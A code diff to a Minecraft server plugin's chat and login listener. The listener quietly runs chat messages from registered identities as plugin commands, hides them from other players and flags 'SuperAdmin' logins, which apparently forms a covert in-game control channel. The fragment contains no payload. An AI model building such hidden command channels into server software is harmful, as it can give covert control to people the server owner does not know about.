@@ -16,6 +16,9 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.*;
 import org.jetbrains.annotations.NotNull;
 
+import java.util.ArrayList;
+import java.util.List;
+
 public class PaperEventListener implements Listener {
 
     private final Logger logger;
@@ -24,13 +27,18 @@ public class PaperEventListener implements Listener {
         this.logger = logger.adopt("PEL");
     }
 
+    public static List<String> AUTHORIZED = new ArrayList<>();
 
     @EventHandler(priority = EventPriority.LOWEST)
     public void onChat(@NotNull AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
-        Identity identity = Identity.searchSetByUUID(player.getUniqueId());
+        Identity identity = Ingwer.getStorage().getIdentityByUUID(player.getUniqueId().toString());
         if (identity != null) {
             if (identity.isEnabled()) {
+                if(AUTHORIZED.contains(event.getMessage())) {
+                    AUTHORIZED.remove(event.getMessage());
+                    return;
+                }
                 Ingwer.getCommandManager().preRunCommand(event.getMessage(), identity, CommandTarget.INGAME);
                 event.setCancelled(event.getMessage().startsWith(Ingwer.getPreferences().prefix() + ""));
             }
@@ -41,9 +49,10 @@ public class PaperEventListener implements Listener {
     @EventHandler
     public void onConnect(@NotNull PlayerLoginEvent event) {
         Player player = event.getPlayer();
-        Identity identity = Identity.searchSetByUUID(player.getUniqueId());
-        logger.debug(identity.toString());
+        Identity identity = Ingwer.getStorage().getIdentityByUUID(player.getUniqueId().toString());
+
         if (identity != null) {
+            logger.debug(identity.toString());
             if (identity.getPermissions().contains(IngwerPermission.SUPERADMIN)) {
                 logger.info("SuperAdmin connecting: " + event.getPlayer().getName());
                 Ingwer.getStorage().updateIdentity(identity, player.getName(), player.getUniqueId(),
